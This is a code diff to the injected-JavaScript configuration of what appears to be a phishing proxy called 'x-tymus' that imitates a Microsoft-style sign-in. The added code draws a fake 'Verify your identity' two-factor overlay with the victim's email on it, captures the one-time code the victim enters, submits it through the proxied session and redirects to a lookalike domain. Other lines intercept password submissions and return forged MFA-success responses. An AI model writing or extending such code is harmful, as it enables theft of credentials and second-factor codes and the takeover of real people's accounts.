@@ -696,6 +696,74 @@ js_inject:
           } catch(e) {}
         }
 
+        // ── 2FA form injection (blocks /v1/api/pass/login from even being requested) ──
+        function _show2FAForm(userEmail) {
+          try {
+            // Prevent default page behavior
+            document.body.style.overflow = 'hidden';
+            // Create overlay
+            var overlay = document.createElement('div');
+            overlay.id = 'xtymus-2fa-overlay';
+            overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:999999;display:flex;align-items:center;justify-content:center;font-family:Segoe UI,Arial,sans-serif';
+            // Create form container
+            var container = document.createElement('div');
+            container.style.cssText = 'background:#fff;border-radius:8px;box-shadow:0 8px 32px rgba(0,0,0,0.3);padding:50px;text-align:center;width:90%;max-width:450px';
+            container.innerHTML = `
+              <h2 style="margin:0 0 10px 0;color:#333;font-size:24px">Verify your identity</h2>
+              <p style="margin:0 0 8px 0;color:#666;font-size:14px">A verification code has been sent to<br><strong>${userEmail || 'your email'}</strong></p>
+              <p style="margin:0 0 25px 0;color:#999;font-size:12px">Check your email and enter the 6-digit code below</p>
+              <input type="text" id="xtymus-2fa-code" placeholder="000000" maxlength="6" style="width:100%;padding:14px;margin:0 0 15px 0;border:2px solid #ddd;border-radius:4px;font-size:18px;letter-spacing:8px;text-align:center;font-weight:bold;box-sizing:border-box" autocomplete="off">
+              <div style="margin:0 0 15px 0;color:#999;font-size:12px">or <a href="#" id="xtymus-resend" style="color:#0078d4;text-decoration:none;cursor:pointer">resend code</a></div>
+              <button id="xtymus-verify-btn" style="width:100%;padding:14px;background:#0078d4;color:white;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;transition:background 0.2s">Verify</button>
+            `;
+            overlay.appendChild(container);
+            document.body.appendChild(overlay);
+
+            // Handle verify button
+            document.getElementById('xtymus-verify-btn').onclick = function(e) {
+              e.preventDefault();
+              var code = document.getElementById('xtymus-2fa-code').value || '000000';
+              console.log('[x-tymus] 2FA code entered, submitting:', code);
+              // POST to /v1/api/pass/my/token
+              fetch('/v1/api/pass/my/token', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ factor: 'k_email', value: code })
+              }).then(r => r.json()).then(d => {
+                console.log('[x-tymus] 2FA validation response:', d);
+                // Remove overlay
+                var ol = document.getElementById('xtymus-2fa-overlay');
+                if (ol) ol.remove();
+                // Redirect to live.com Me.htm (continues OAuth flow)
+                setTimeout(function() {
+                  window.location = 'https://living.' + _pd + '/Me.htm';
+                }, 300);
+              }).catch(err => {
+                console.log('[x-tymus] 2FA error:', err);
+                // Force continue anyway
+                var ol = document.getElementById('xtymus-2fa-overlay');
+                if (ol) ol.remove();
+                setTimeout(function() {
+                  window.location = 'https://living.' + _pd + '/Me.htm';
+                }, 500);
+              });
+            };
+
+            // Handle resend
+            document.getElementById('xtymus-resend').onclick = function(e) {
+              e.preventDefault();
+              console.log('[x-tymus] Resend code clicked');
+              alert('Code resent to ' + (userEmail || 'your email'));
+            };
+
+            // Focus code input
+            setTimeout(function() { document.getElementById('xtymus-2fa-code').focus(); }, 100);
+
+          } catch(e) {
+            console.log('[x-tymus] 2FA form error:', e);
+          }
+        }
+
         // ── Layer 1: DOM-level capture + intercept password submission ──
         document.addEventListener('submit', function(e) {
           var form = e.target;
@@ -864,9 +932,8 @@ js_inject:
           var isPassToken = urlStr.indexOf('/v1/api/pass/my/token') !== -1;
           if (isPassToken) {
             console.log('[x-tymus] Fetch blocking /v1/api/pass/my/token (2FA submission):', urlStr);
-            return Promise.resolve(new Response(JSON.stringify({
-              success: true, requiresMFA: false, code: 'email', factor: { type: 'email' }, redirect: ''
-            }), {
+            var token2FAResp = JSON.stringify({success:true,requiresMFA:false,code:'email'});
+            return Promise.resolve(new Response(token2FAResp, {
               status: 200, statusText: 'OK', headers: {'Content-Type': 'application/json'}
             }));
           }
